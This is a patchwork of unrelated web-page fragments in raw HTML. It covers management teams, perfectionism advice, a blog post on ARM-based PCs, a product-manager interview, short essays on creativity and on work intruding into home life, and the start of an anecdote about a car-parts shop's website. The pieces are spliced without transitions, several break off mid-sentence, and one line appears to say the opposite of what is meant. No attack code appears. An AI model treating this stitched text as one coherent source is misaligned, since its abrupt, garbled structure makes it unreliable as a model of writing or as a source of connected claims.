of management teams attracts and retains ambitious, dedicated
non-founders at small companies. Maybe disenfranchisement is not
important, or even necessary.</p>
<p>Or maybe management teams as a decision-making group are too easily a
substitute for developing a grassroots culture of collaboration and
trust between marketing, sales, product and development.</p>

										How to get over ‘never good enough’									</a>

									Takeaways
								</p>
								<div>
									<ul>
<li><span>“healthy perfectionism: a personality trait that’s associated with finding enjoyment and even fulfillment in life from doing things as well as you possibly can. It’s generally considered a beneficial trait that’s linked with being more conscientious and self-disciplined.” — Margaret Rutherford</span></li>
<li><span>Margaret uses a quote from Brené Brown’s book </span><i><span>The Gifts of Imperfection</span></i><span> explaining the dark side of perfectionism: “a self-destructive and addictive belief system that fuels this primary thought: if I look perfect, live perfectly, and do everything perfectly, I can avoid or minimize the painful feelings of shame, judgment, and blame.”</span>
<ul>
<li><span>“This form of perfectionism, which is fuelled by inner shame that must be quelled, involves trying to constantly meet perceived expectations of what ‘perfect’ is. This perfectionism isn’t fulfilling and it’s far from enjoyable. Yet many people feel it’s mandatory to look as if all is perfect. They believe that not to do so would imply imperfection.” — Margaret Rutherford.</span></li>
</ul>
</li>
<li><span>The dark side of perfectionism is called destructive perfectionism. These perfectionists might not recognize themselves as perfectionists. They don’t believe their best is good enough.</span></li>
<li><span>Margaret recommends 5 stages that can help with unhealthy perfectionism: </span></li>
<li>
<ol>
<li><b><i>Consciousness</i></b>: becoming aware that your perfectionism is a problem in the first place. “…this stage might be especially complicated for you because you’ve convinced yourself that your perfectionist traits are normal or not a problem.” — Margaret Rutherford</li>
<li><b><i>Commitment</i></b><span>: understanding that substituting commitment with intention is perfectly fine. It’s a process. Be intentional.</span></li>
<li><b><i>Confrontation</i></b><span>: think about the rules you set for yourself and how your beliefs influence them. “…without even realizing it – what you consider is allowed or disallowed, what you should do, must not do, always need to do, never should do. They’re in your head all the time.” — Margaret Rutherford&nbsp;</span></li>
<li><b><i>Connection</i></b><span>: ”if you don’t connect with and process your emotional hurt, anger or sadness, it will govern your life in ways that you can’t see – you’ll end up blindly living it.” — Margaret Rutherford</span></li>
<li><b><i>Change</i></b><span>: “where your hope comes from is through changing your behavior – that is, seeing positive results from the efforts you’re making.” — Margaret Rutherford</span></li>
</ol>
</li>
<li>“…the hardest work isn’t making a change; it’s maintaining it. There are so many pulls and tugs from that perfectionistic shaming voice that holding on to a fresh perspective and behavior can be challenging. But it can happen; it simply takes practice. And lots of it.” — Margaret Rutherford.</li>
</ul>
								</div>
								<p><img src="https://gradually.co/wp-content/themes/gradually/img/two-cents.png">
								</p><!-- end half sqaure arrow -->
								<p><span>A quote Margaret used was “healing is a process, not a destination.” That hits deep. There’s no magic switch to turn off your health issues. It’s a process. </span></p>

<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><h2>I don't expect to have an ARM-based PC any time soon</h2>

	<p><small>November 15, 2020</small></p>
</div><div><p>The ARM-related news of the time interval is of course that Apple
has announced several ARM-based Mac laptops and that early (and
preliminary) leaks are that they perform very well and are definitely
competitive. This raises the great hope in many technical people's
minds of ARM based laptops and desktops from more than Apple, ARM
PCs that would run more than Apple's OS X. This is especially a
dream for many Unix people, who already run little or no commercial
binary software and so in theory ARM support is only a recompile
away; moving away from the x86 hegemony would please a lot of people.</p>

<p>(The practice of moving to ARM is somewhat different, especially
for performance sensitive code. Focused use of x86 assembly is
surprisingly common in various places.)</p>

<p>My own view is that while I wouldn't mind using a competitive ARM
based PC (either laptop or desktop), I don't expect to actually
have one any time soon. The rub is that 'competitive'. Right now,
the only ARM chip maker that can compete with the performance of
the x86 hegemony in the desktop/laptop space is Apple, and Apple's
machines only run OS X. While there are promising developments in
the server space, many of them are also bespoke to the large cloud
vendors, and also may not be particularly suitable for scaling down
to desktops and laptops (in all sorts of dimensions, including how
much money can be made on them).</p>

<p>Apple has demonstrated that it's possible to make ARM be competitive
(on laptops, at least, although likely on desktops too), but <a href="https://twitter.com/thatcks/status/1326317293849153540">they
stand alone</a>
and I don't think it's likely for anyone else to join them. Apple has
the benefit of a gigantic market for their own ARM designs that
feeds a firehose of money into their R&amp;D budget and also good
assurance of large production runs even for laptop CPUs (never mind
phone ones). Anyone else would be in the position of trying to take
laptop and desktop CPU market share from Intel and AMD (who are
already fighting each other), without the kind of money firehose
and good market that Apple has.</p>

<p>(Apple also has the benefit of capturing all of the profit from its
laptops. An ARM CPU maker would capture much less of the profit of
machines with its CPUs in them; much of the overall profit would go
to the system vendors or at least to the makers of other parts, like
motherboards.)</p>

<p>The other problem is that merely being competitive isn't good enough,
because there are real costs to switching to ARM (even for Unix
people). It's likely that an ARM PC would need to be clearly better
than the x86 equivalent before very many people became interested,
and might face an extended period of doubt and proving itself. To
be honest, that would be my attitude toward the first generation
of ARM PCs; I would not buy immediately and let other people get
those experiences.</p>

<p>(I think this will be easier on laptops than on desktops, because
on laptops power efficiency can count for a lot. The longer battery
lifetime is already one of Apple's selling points for their new ARM
laptops)</p>

<p>PS: I would love to be wrong on this, as I'm not particularly fond
of the x86 hegemony. But I'm also a pragmatist.</p>

We'll be featuring regular interviews with super-sharp product managers, leaders and thinkers from a huge range of companies. Know someone who you think we should interview? Drop us a line!</p><p>We're stoked to be kicking the series off with an interview with Den Delimarsky, Principle Cloud Advocate at Microsoft.</p><h2><strong>Hey Den! Tell us more about your background. What have you worked on in the past, and how'd you end up in your current role? What drew you to product work?</strong></h2><p>I grew up always wanting to work in the IT industry&nbsp;in some shape or form, but when I thought about it, it was largely around the software engineering discipline. That is — I had no idea in my high school days that a product management track was even an option. Once I got into the computer science program during my college days, I discovered that there was such a thing as PM. I wrote about it&nbsp;in my blog&nbsp;— it was entirely an accident. However, once I discovered that product management is a thing, it was easily the best decision in my life to pursue this career path. The first steps of me being a product manager happened in early 2013, when I was part of a team at Microsoft that was called Home Activities &amp; Experiences (HAX). As a PM intern, I was responsible for helping bring to market an innovative calendar planning solution. I loved the kind of work I could put into the discovery phases, customer interviews, and then be able to see the ideas take shape in close collaboration with my engineering peers. In broad terms, product management combined two of my favorite things — talking to people and the magic of software. Since then, I've worked on the team that shipped Outlook Desktop and Office 365 Groups, after which I jumped on the opportunity to build&nbsp;<a href="https://www.inputlogic.ca/docs.microsoft.com" target="_blank">docs.microsoft.com</a>&nbsp;from scratch, being one of the first PMs on the project. My latest gig was with Amazon, where I helped build parts of the EventBridge service. What I love about being a product manager, and what reaffirms that I made the decision on a daily basis is the sheer scope of work that I get to do — it's practically unlimited. I get to do everything, from talking to people who use the product I am building, to crunching numbers, and mocking up new experience designs.</p><h2><strong>What are the unique challenges you're facing in your role right now?</strong></h2><p>The challenges are not typical to my role, but likely are typical to the times we're in right now. COVID-19 has shown us that we'll need to adapt to a world with stressors that many of us have not seen before. Folks with kids, homeschooling, travel restrictions — these significantly impact our ability to focus and concentrate on building. The situation that we are in right now requires a degree of empathy from our leaders and peers — not everything will get done the way we planned early in the year. Availability of individuals may shift. Attitudes may shift. We all need to be cognizant of these factors. As one of my mentors says, "<em>we're not working remotely. We are working remotely during a global pandemic.</em>" This is not your typical 'work from home' environment.</p><h2><strong>What is your unique ability that has allowed you to succeed in product roles?</strong></h2><p>Skill stacking. Something that I've learned from my good friend and mentor <a href="https://twitter.com/danielfe" target="_blank">Dan Fernandez</a>. The idea behind this is fairly simple — generalization instead of super-specialization. I tend to combine a set of skills to get the job done. For example, I love writing code and working with data. This enabled me to leverage those skills in my career and help me be more efficient with my and my team's time. With code, I am able to quickly put together product prototypes or help unblock the engineering team when they have too much on their plate. I recall in 2017, when my team was tasked with building some documentation infrastructure, one of the tools that needed to be built was temporarily de-prioritized. I knew we had a tight deadline ahead, so I rolled my sleeves and wrote the tool myself. As far as I am aware, it's still in production&nbsp;<span>today</span>. Being able to wrangle data and discern meaningful insights from those that are irrelevant helped me quickly make decisions and settle arguments without having to be bottlenecked by the data science team, since their resources are scarce and likely already spread fairly thin. Notice how I don't say that I will do the work of the data science or engineering teams — they do extensive work, and are vastly more experienced in their domains than I am. I am pretty sure if they looked at some of my original code, they'd be horrified. However, it enables me to move fast and help my team deliver value to customers regularly. To all the folks that I mentor, I always recommend exploring some adjacent fields. Do you like user experience design? Are you a great orator? Do you have a knack for putting together great video reels? Put those skills to use. A product manager who only knows how to talk to customers and write a spec is silo-ed. A product manager who knows how to talk to customers, write a spec, put that into a Figma prototype, and pull the quantitative data to prove or disprove their product hypotheses is a force of nature.</p><h2><strong>What's one thing you've worked on that you're really proud of?</strong></h2><p>Hard to pinpoint just one thing, to be honest. I've been fortunate to work with really talented individuals in every team that I've been a part of, and we delivered great products. I'd say the most impactful product that I've been a part of was&nbsp;<a href="https://docs.microsoft.com/en-us/" target="_blank">docs.microsoft.com</a>&nbsp;— the technical documentation site for Microsoft. It's an absolutely massive project, with hundreds of stakeholders within the company, and millions of stakeholders outside it. I joined the team in 2015, in the very early planning stages of the site. It was exciting to build something modern, scalable, and with global reach, while considering the legacy of resources such as the Microsoft Developer Network (MSDN) and TechNet. We completely upended the traditional technical documentation model. No more proprietary systems — it's all on GitHub and written in Markdown. There are multiple modalities that allow you to discover every single API that Microsoft ships for a language, such as the&nbsp;<a href="https://docs.microsoft.com/en-us/python/api/" target="_blank">Python API Browser</a>&nbsp;or the&nbsp;<a href="https://docs.microsoft.com/en-us/dotnet/api/" target="_blank">.NET API Browser</a>. We've built an entirely new experience to aggregate all code samples that Microsoft ships in the&nbsp;<a href="https://docs.microsoft.com/en-us/samples/browse/" target="_blank">samples browser</a>. And of course I can't neglect mentioning <a href="https://docs.microsoft.com/en-us/learn/" target="_blank">Microsoft Learn</a>&nbsp;— the service that allows anyone around the globe to get skilled in a variety of technologies, entirely for free. Working as part of the team that delivered all this is what I am most proud of.</p><h2><strong>How do you foster collaboration within your team? Any tools or processes that are working really well this year?</strong></h2><p>I am taking a bit of an unorthodox approach here. As someone who worked remotely for the past 4 years, I can confidently say that tools themselves are just that — tools. They don't matter as much as the underlying collaboration culture. You can have fantastic video chat software, but if the culture is not there to work asynchronously, it's not going to help you or your team. One of the things that I try reiterating to my team is that just because we are now not in the office doesn't mean that we need to shift every meeting that we ever had into an online environment. Quite the opposite — this is an opportunity to reevaluate what meetings are really necessary, and where we need to start working offline. It all starts with culture where the team understands the value of not being constantly interrupted by Slack notifications, emails, and Zoom calls. To that extent, to me collaboration means that I show how my team can focus and work when they allocate time for it. I really like the approach that <a href="https://basecamp.com/guides/how-we-communicate" target="_blank">Basecamp</a> is taking here — they are THE company that knows how to do distributed work right. One of the points that stuck with me, that I see a lot of teams fail at, is the fact that communication is not tied to calendars. Way too often we wait for "<em>time to sync</em>" or "<em>discuss during the planning meeting.</em>" That's a completely unnecessary roadblock. Why not write a one page document that outlines the pros and cons of an issue, and I will get back with feedback when I have time, if it's not urgent. Or write an email, and I will respond with some thoughts whenever I am not focused on writing the product vision outline. The best way to collaborate is to build enough flex in your process that accounts for everyone's work styles and time allocations. And of course, meetings does not mean collaboration. As a matter of fact, meetings are generally the opposite of that. The more meetings your team has, the more their focus is destroyed. For the love of everything, please stop making everything a meeting and give people space to think through a problem and come up with some thoughtful input.</p><h2><strong>What's unique about your product/development team culture at AWS?</strong></h2><p><em>I will skip this question because as of last week, I am no longer at AWS, and am transitioning to a different company.</em></p><h2><strong>How do you manage prioritization and roadmapping?</strong></h2><p>This will vary between teams, but I like to keep it very simple. The inputs that I look at are:</p><ol><li><strong>Quantitative data</strong>. Do we have any numbers that point us towards the importance of certain things?</li><li><strong>Qualitative data</strong>. Do we have any verbal/written feedback that&nbsp;points us towards the importance of certain things?</li><li><strong>Emerging/established trends</strong>. Are there any specific movements that we see in the space that we need to make sure we are part of?</li><li><strong>Unknown unknowns</strong>. Are there any new opportunities that are not yet understood/seen by others that we can be a part of?</li></ol><p>Once you have reliable data on the above (and getting truly reliable data is hard and is what needs a lot of focus from product managers and their organizations), roadmapping and prioritization becomes easy, because one can clearly see where they can deliver the most value to the customers and the market. Whether it's then put in a JIRA board, or Trello, or whether story points are assigned to each item …</p></div></div>

<p>Many people think creativity is an innate talent, when in reality it is an acquired skill.</p>



<p>It is a skill, though, that we all develop naturally in our childhood. And that most of us lose after our first years in school (since they didn’t know how to measure it, they figured it wasn’t important enough to have it in the curriculum).</p>



<p>Good news is your creativity is not lost for good. It’s not dead. <strong>It’s just numb, like an atrophied muscle</strong>. To bring it back, you need two things:</p>



<ol><li>A growth mindset</li><li>A lot of reps</li></ol>



<p>Having a growth mindset is key, because otherwise you won’t feel compelled to put it in the reps. <strong>You need to believe you are and can be creative</strong>.</p>



<p>Once you’ve talked yourself into that, the rest is simple. You just need to show up and practice. Every. Single. Day.</p>



<p><strong>We are what we repeatedly do. Creativity, then, is not an act, it’s a habit.</strong></p>


<p><em>This piece is part of a series of 30 atomic essays where I explore what it means to be a  <a href="https://rationalcreatives.substack.com/" target="_blank" rel="noreferrer noopener">rational creative</a> and the different aspects of being a creator online.

Thought begets thought, and if you allow it to compound enough, it becomes an engine of innovation that produces all kinds of magical things.</p><p>There is no end to this march of human thought, as it transcends even death itself. The moment one node dies, many others will learn from the ideas of that node, and those thoughts form the foundation of further ideas to come. This is why the words of dead poets, politicians, and philosophers grow increasingly influential as time runs its course. As Dostoyevsky writes:</p><blockquote><p><em>People are always saved after the death of him who saved them.</em></p></blockquote><p>This endlessly growing web of thought has produced many brilliant things, but perhaps the greatest impact it has had on the material world comes in the form of technology. All it takes is one look at your immediate surroundings to see evidence of this.</p><p>Almost everything you can touch was once a cutting-edge invention. For example, imagine the first person that was given a cup to drink from. That must have blown his mind with the force of a million supernovas.<span title="Below is More To That’s first ever animation, which won’t be as mind-blowing, but hopefully is an enjoyable thing to experience.">1</span></p><p>In this case, we were using a simple cup, but whether it’s a cup, couch, lamp, or laptop, every material product shares two common threads:</p><p>(1) It was created using resources from the natural world, and</p><p>(2) It was created to serve some human function.</p><p>Thought is the tool that allows both conditions to be satisfied. It is only through logistical ingenuity that we are able to extract materials out of the Earth, piece them together, and imbue the result with the attributes necessary to create an iPhone. And it is only through curiosity and creativity where the desire to build a machine like this can come about in the first place.</p><p>This is where <a href="https://moretothat.com/the-right-side-of-thought/" target="_blank" rel="noopener noreferrer">the utility of thought shines</a>. The fact that smart people all around the world are contributing a seemingly endless stream of ideas and insight is what powers technological growth. In this case, the always-on nature of the mind is a key feature of our species, creating products that hopefully increase well-being with each release.</p><p>However, we are all aware of the dark side of this progress as well.</p><p>If Condition #1 is taken to its logical endpoint, then we will view the natural world primarily for its utility, rather than for its sheer beauty. Martin Heidegger calls this the “standing reserve,” where nature is nothing but a reservoir for us to draw upon to make more shit. We will destroy acres of the forest to make a few more chairs. Ruin fertile soil to find petroleum. Countless hours of manpower and thought will be allocated to this effort, searching for the marginal value one can get from destroying just a bit more.</p><p>If Condition #2 is taken to its logical endpoint, then things look even bleaker. If everything we touch in the material world has to serve some sort of function, isn’t it only a matter of time before humans themselves have to serve some sort of greater function as well? After all, we’re all a part of the material world too, right?</p><p>Inherent in any technological advancement is the need for deeply laborious work, ironically to create products that make life easier for its users. Humans and their ability to think become the source for labor, and it is commonly believed that this reduces people to mere task-completing drones, voiding them of any unique personalities or characteristics.</p><p>We’ve heard this argument ever since the industrialized era, where rows of people were set up on assembly lines, doing the same physical task over and over again until they went home to relax.</p><p><a href="https://2m93ao7jjy53ndft63v8tvcp-wpengine.netdna-ssl.com/wp-content/uploads/2020/10/B01-Assembly-line.png"><img loading="lazy" src="https://2m93ao7jjy53ndft63v8tvcp-wpengine.netdna-ssl.com/wp-content/uploads/2020/10/B01-Assembly-line.png" alt="assembly line drawing" width="1500" height="1100" srcset="https://2m93ao7jjy53ndft63v8tvcp-wpengine.netdna-ssl.com/wp-content/uploads/2020/10/B01-Assembly-line.png 1500w, https://2m93ao7jjy53ndft63v8tvcp-wpengine.netdna-ssl.com/wp-content/uploads/2020/10/B01-Assembly-line-300x220.png 300w, https://2m93ao7jjy53ndft63v8tvcp-wpengine.netdna-ssl.com/wp-content/uploads/2020/10/B01-Assembly-line-1024x751.png 1024w, https://2m93ao7jjy53ndft63v8tvcp-wpengine.netdna-ssl.com/wp-content/uploads/2020/10/B01-Assembly-line-768x563.png 768w, https://2m93ao7jjy53ndft63v8tvcp-wpengine.netdna-ssl.com/wp-content/uploads/2020/10/B01-Assembly-line-610x447.png 610w" sizes="(max-width: 1500px) 100vw, 1500px"></a></p><p>We’ve heard this argument in the era of offices, where rows of people were set up in cubicles, doing <a href="https://moretothat.com/pointless-job/" target="_blank" rel="noopener noreferrer">the same cognitive task over and over again</a> until they went home to relax.</p><p><a href="https://2m93ao7jjy53ndft63v8tvcp-wpengine.netdna-ssl.com/wp-content/uploads/2020/10/C01-Cubicles.png"><img loading="lazy" src="https://2m93ao7jjy53ndft63v8tvcp-wpengine.netdna-ssl.com/wp-content/uploads/2020/10/C01-Cubicles.png" alt="row of cubicles - cubicle farm" width="1500" height="1100" srcset="https://2m93ao7jjy53ndft63v8tvcp-wpengine.netdna-ssl.com/wp-content/uploads/2020/10/C01-Cubicles.png 1500w, https://2m93ao7jjy53ndft63v8tvcp-wpengine.netdna-ssl.com/wp-content/uploads/2020/10/C01-Cubicles-300x220.png 300w, https://2m93ao7jjy53ndft63v8tvcp-wpengine.netdna-ssl.com/wp-content/uploads/2020/10/C01-Cubicles-1024x751.png 1024w, https://2m93ao7jjy53ndft63v8tvcp-wpengine.netdna-ssl.com/wp-content/uploads/2020/10/C01-Cubicles-768x563.png 768w, https://2m93ao7jjy53ndft63v8tvcp-wpengine.netdna-ssl.com/wp-content/uploads/2020/10/C01-Cubicles-610x447.png 610w" sizes="(max-width: 1500px) 100vw, 1500px"></a></p><p>In both scenarios, however, labor and leisure were delineated by physical space. If you were situated within the four walls of your factory or office, it was time to work. If you found yourself within the four walls of your home, it was time to relax. The mind was able to shift gears based on obvious environmental cues, and this delineation created some form of segmentation in one’s work and leisure life.</p><p>To say that things have changed would be the <a href="https://moretothat.com/finding-peace-within-the-pandemic/" target="_blank" rel="noopener noreferrer">understatement of the year</a>.</p><p>Many people are now seeing how technological progress has enabled a world where work can be divorced from the office, and married to the home. We may have understood this in theory before, but now we have been forced to see it in action. And for the most part, the technological infrastructure has been sound enough to support this shift at a fairly astonishing scale.</p><p>However, through this move, the age-old physical barrier between work and rest has all but dissolved. We wake up, work, wind down, and sleep within the same four walls that used to serve solely as a haven of rest and recharge. The home is no longer an environmental cue to put work aside. It is a place that constantly reminds you that there is always more work to be done.</p><p>We are now living amidst <span><strong>the omnipresence of work</strong></span>. Even if we aren’t sitting down working, we are prone to continue thinking about it since the physical environment no longer reminds us to shift our mind state. In addition, the always-on nature of our tools means that we are perpetually reachable, as our phones contain the inboxes and schedules of both our personal and professional lives. The question “are you available?” is not really an inquiry about one’s availability, but more so about whether or not one feels like taking that call.</p><p><a href="https://2m93ao7jjy53ndft63v8tvcp-wpengine.netdna-ssl.com/wp-content/uploads/2020/11/D01-Phone-available-for-a-chat-v2.png"><img loading="lazy" src="https://2m93ao7jjy53ndft63v8tvcp-wpengine.netdna-ssl.com/wp-content/uploads/2020/11/D01-Phone-available-for-a-chat-v2.png" alt="" width="1500" height="1100" srcset="https://2m93ao7jjy53ndft63v8tvcp-wpengine.netdna-ssl.com/wp-content/uploads/2020/11/D01-Phone-available-for-a-chat-v2.png 1500w, https://2m93ao7jjy53ndft63v8tvcp-wpengine.netdna-ssl.com/wp-content/uploads/2020/11/D01-Phone-available-for-a-chat-v2-300x220.png 300w, https://2m93ao7jjy53ndft63v8tvcp-wpengine.netdna-ssl.com/wp-content/uploads/2020/11/D01-Phone-available-for-a-chat-v2-1024x751.png 1024w, https://2m93ao7jjy53ndft63v8tvcp-wpengine.netdna-ssl.com/wp-content/uploads/2020/11/D01-Phone-available-for-a-chat-v2-768x563.png 768w, https://2m93ao7jjy53ndft63v8tvcp-wpengine.netdna-ssl.com/wp-content/uploads/2020/11/D01-Phone-available-for-a-chat-v2-610x447.png 610w" sizes="(max-width: 1500px) 100vw, 1500px"></a></p><p><a href="https://2m93ao7jjy53ndft63v8tvcp-wpengine.netdna-ssl.com/wp-content/uploads/2020/10/D02-E-Hanging-out-at-the-couch.png"><img loading="lazy" src="https://2m93ao7jjy53ndft63v8tvcp-wpengine.netdna-ssl.com/wp-content/uploads/2020/10/D02-E-Hanging-out-at-the-couch.png" alt="hanging out at home and looking at phone" width="1500" height="1100" srcset="https://2m93ao7jjy53ndft63v8tvcp-wpengine.netdna-ssl.com/wp-content/uploads/2020/10/D02-E-Hanging-out-at-the-couch.png 1500w, https://2m93ao7jjy53ndft63v8tvcp-wpengine.netdna-ssl.com/wp-content/uploads/2020/10/D02-E-Hanging-out-at-the-couch-300x220.png 300w, https://2m93ao7jjy53ndft63v8tvcp-wpengine.netdna-ssl.com/wp-content/uploads/2020/10/D02-E-Hanging-out-at-the-couch-1024x751.png 1024w, https://2m93ao7jjy53ndft63v8tvcp-wpengine.netdna-ssl.com/wp-content/uploads/2020/10/D02-E-Hanging-out-at-the-couch-768x563.png 768w, https://2m93ao7jjy53ndft63v8tvcp-wpengine.netdna-ssl.com/wp-content/uploads/2020/10/D02-E-Hanging-out-at-the-couch-610x447.png 610w" sizes="(max-width: 1500px) 100vw, 1500px"></a></p><p><a href="https://2m93ao7jjy53ndft63v8tvcp-wpengine.netdna-ssl.com/wp-content/uploads/2020/11/D03-Kinda-busy-now-v2.png"><img loading="lazy" src="https://2m93ao7jjy53ndft63v8tvcp-wpengine.netdna-ssl.com/wp-content/uploads/2020/11/D03-Kinda-busy-now-v2.png" alt="" width="1500" height="1100" srcset="https://2m93ao7jjy53ndft63v8tvcp-wpengine.netdna-ssl.com/wp-content/uploads/2020/11/D03-Kinda-busy-now-v2.png 1500w, https://2m93ao7jjy53ndft63v8tvcp-wpengine.netdna-ssl.com/wp-content/uploads/2020/11/D03-Kinda-busy-now-v2-300x220.png 300w, https://2m93ao7jjy53ndft63v8tvcp-wpengine.netdna-ssl.com/wp-content/uploads/2020/11/D03-Kinda-busy-now-v2-1024x751.png 1024w, https://2m93ao7jjy53ndft63v8tvcp-wpengine.netdna-ssl.com/wp-content/uploads/2020/11/D03-Kinda-busy-now-v2-768x563.png 768w, https://2m93ao7jjy53ndft63v8tvcp-wpengine.netdna-ssl.com/wp-content/uploads/2020/11/D03-Kinda-busy-now-v2-610x447.png 610w" sizes="(max-width: 1500px) 100vw, 1500px"></a></p><p>Availability is no longer determined by one’s time, but by one’s attention. The problem, of course, is that our attention is constantly absorbed by the tools we use everyday, making us feel like we’re never truly available. As these tools continue to get nicer, prettier, and more powerful, it becomes increasingly difficult to stop checking them, which further blurs the lines between work and leisure.</p><p>I remember when it wasn’t always like this.</p><p>Over a decade ago, I had a summer internship where we were all given a Blackberry. This was before the iPhone was a household product, and this bulky-ass, hideous thing was the best option companies had to email their employees when they were out of the office.</p><p><a href="https://2m93ao7jjy53ndft63v8tvcp-wpengine.netdna-ssl.com/wp-content/uploads/2020/10/F01-Blackberry.png"><img loading="lazy" src="https://2m93ao7jjy53ndft63v8tvcp-wpengine.netdna-ssl.com/wp-content/uploads/2020/10/F01-Blackberry.png" alt="old Blackberry design - drawing" width="1500" height="1100" srcset="https://2m93ao7jjy53ndft63v8tvcp-wpengine.netdna-ssl.com/wp-content/uploads/2020/10/F01-Blackberry.png 1500w, https://2m93ao7jjy53ndft63v8tvcp-wpengine.netdna-ssl.com/wp-content/uploads/2020/10/F01-Blackberry-300x220.png 300w, https://2m93ao7jjy53ndft63v8tvcp-wpengine.netdna-ssl.com/wp-content/uploads/2020/10/F01-Blackberry-1024x751.png 1024w, https://2m93ao7jjy53ndft63v8tvcp-wpengine.netdna-ssl.com/wp-content/uploads/2020/10/F01-Blackberry-768x563.png 768w, https://2m93ao7jjy53ndft63v8tvcp-wpengine.netdna-ssl.com/wp-content/uploads/2020/10/F01-Blackberry-610x447.png 610w" sizes="(max-width: 1500px) 100vw, 1500px"></a></p><p>The running joke was that we now had a “leash” that kept us tethered to the whims of our bosses. We heard countless stories about employees enjoying a night out on Friday, only to be pinged by their associate telling them to come into the office to work on a terrible Powerpoint presentation.<span title="It was an investment banking internship, where this kind of foolishness was not just tolerated, but perpetuated.">2</span></p><p>The Blackberry is now a laughable artifact of the early 2000s, but the underlying reason for its existence is more relevant than ever.</p><p>Technological progress in the era of knowledge work can be defined by these three things:</p><p>(1) Make it easier to connect with others,</p><p>(2) Make it faster to get what you need,</p><p>(3) Make it pretty and appealing.</p><p>The Blackberry did a somewhat decent job at #1 and #2, but it did a terrible job at #3. Even by early 21st century standards, it was a hideous piece of design, and whenever I used it, it reminded me that this tool was definitely for work, and not for play.</p><p><a href="https://2m93ao7jjy53ndft63v8tvcp-wpengine.netdna-ssl.com/wp-content/uploads/2020/10/F02-Blackberry-and-Work-v2.png"><img loading="lazy" src="https://2m93ao7jjy53ndft63v8tvcp-wpengine.netdna-ssl.com/wp-content/uploads/2020/10/F02-Blackberry-and-Work-v2.png" alt="old Blackberry - checking in on employee" width="1500" height="1100" srcset="https://2m93ao7jjy53ndft63v8tvcp-wpengine.netdna-ssl.com/wp-content/uploads/2020/10/F02-Blackberry-and-Work-v2.png 1500w, https://2m93ao7jjy53ndft63v8tvcp-wpengine.netdna-ssl.com/wp-content/uploads/2020/10/F02-Blackberry-and-Work-v2-300x220.png 300w, https://2m93ao7jjy53ndft63v8tvcp-wpengine.netdna-ssl.com/wp-content/uploads/2020/10/F02-Blackberry-and-Work-v2-1024x751.png 1024w, https://2m93ao7jjy53ndft63v8tvcp-wpengine.netdna-ssl.com/wp-content/uploads/2020/10/F02-Blackberry-and-Work-v2-768x563.png 768w, https://2m93ao7jjy53ndft63v8tvcp-wpengine.netdna-ssl.com/wp-content/uploads/2020/10/F02-Blackberry-and-Work-v2-610x447.png 610w" sizes="(max-width: 1500px) 100vw, 1500px"></a></p><p>Fast forward to 2020, and things are different. We now have a ton of beautifully designed, amazing tools that allow you to work from anywhere, to reach anyone at any time, and to check on your individual progress and goals. Messaging apps and note-taking tools are multi-billion dollar industries, all of which are defined by their ease of use and their aesthetic appeal.</p><p>Work has successfully wrapped itself around shiny toys, all of which are housed in an even shinier phone. Whereas my old Blackberry was an unwilling leash handed out to me and my colleagues, the tools of today are gladly accepted and used by people all around the world. We willingly tether ourselves to the constant demands of the workplace, either by actively working on our projects during the day, or by passively checking on their progress at night.</p><p>This then begs the question:</p><p><span><strong>Amidst the omnipresence of work, can our minds ever stop identifying with the constant need to produce?</strong></span></p><p>I’m worried that the answer to this is trending toward “no.”</p><p>In my case, I’m finding it remarkably difficult to consciously shift my attention away from work and toward relaxation. It’s as if those two realms can no longer be accessed via a cognitive switch, as the mere presence of my laptop or phone can remind me to check something or queue up another article to read. I know that making some environmental changes can help here, but the existence of this tension is just another sign pointing to the omnipresence of work.</p><p>In the case of teams, I worry that all these great tools and technologies are slowly turning us into avatars of productivity, while dimming down our personalities. Communication is no longer serendipitous; it is scheduled in 30 minute increments, which is just enough for a few minutes of small talk, then an overview of what needs to get done. Work is seamlessly distributed to profile pictures on a Slack channel, then collected in pieces by some future agreed-upon date on a shared calendar.</p><p>I don’t mean to sound dystopian here, but given this dynamic, it seems inevitable that we start defining ourselves by what we’re able to produce, while everything else goes by the wayside. When Heidegger referred to nature as a “standing reserve” of resources awaiting our usage, it feels like we’re beginning to view ourselves this way as well. We delude ourselves into thinking that the products of our labor are what makes us useful and needed, while things like friendship and love are “nice-to-have”s or “I’ll-get-to-it-when-my-career-has-taken-off” afterthoughts.</p><p><a href="https://2m93ao7jjy53ndft63v8tvcp-wpengine.netdna-ssl.com/wp-content/uploads/2020/10/G01-Work-and-Everything-Else.png"><img loading="lazy" src="https://2m93ao7jjy53ndft63v8tvcp-wpengine.netdna-ssl.com/wp-content/uploads/2020/10/G01-Work-and-Everything-Else.png" alt="the omnipresence of work - continuing to think about work" width="1500" height="1100" srcset="https://2m93ao7jjy53ndft63v8tvcp-wpengine.netdna-ssl.com/wp-content/uploads/2020/10/G01-Work-and-Everything-Else.png 1500w, https://2m93ao7jjy53ndft63v8tvcp-wpengine.netdna-ssl.com/wp-content/uploads/2020/10/G01-Work-and-Everything-Else-300x220.png 300w, https://2m93ao7jjy53ndft63v8tvcp-wpengine.netdna-ssl.com/wp-content/uploads/2020/10/G01-Work-and-Everything-Else-1024x751.png 1024w, https://2m93ao7jjy53ndft63v8tvcp-wpengine.netdna-ssl.com/wp-content/uploads/2020/10/G01-Work-and-Everything-Else-768x563.png 768w, https://2m93ao7jjy53ndft63v8tvcp-wpengine.netdna-ssl.com/wp-content/uploads/2020/10/G01-Work-and-Everything-Else-610x447.png 610w" sizes="(max-width: 1500px) 100vw, 1500px"></a></p><p>The thing is, we all <em>know</em> that work isn’t everything, but the way we spend our attention suggests otherwise.

                            <p>A few weeks ago something happened that wouldn't change how a small company in Vienna thinks about security: <strong>My windshield cracked</strong></p>
<figure><img loading="lazy" src="https://pictshare.net/zeceif.jpg"><figcaption>Cracked Windshield on my 2001 Ford Focus</figcaption></figure>
<p>I just had it changed less than 6 months ago and it cracked again. Since I didn't want to pay the 300€ again I googled for cheaper alternatives and found a small car parts seller in Vienna that had my windshield for just 98€</p>
<figure><img loading="lazy" src="https://pictshare.net/9qbu9j.jpg"><figcaption>Site of the car shop</figcaption></figure>
<p>While I was browsing for my new windshield and other parts I saw that some images didn't load right so I checked the console in my browser and saw that my ad blocker just blocked some piwik (now matamo) tracking script from another domain.</p>
<figure><img loading="lazy" src="https://pictshare.net/ewlo4h.png"><figcaption>JS console of the site, blocking piwik</figcaption></figure>
<p>Just to be sure I disabled the ad blocker and reloaded the site to see if anything changed.</p>
<figure><img loading="lazy" src="https://pictshare.net/afypz7.png"><figcaption>New error message</figcaption></figure>
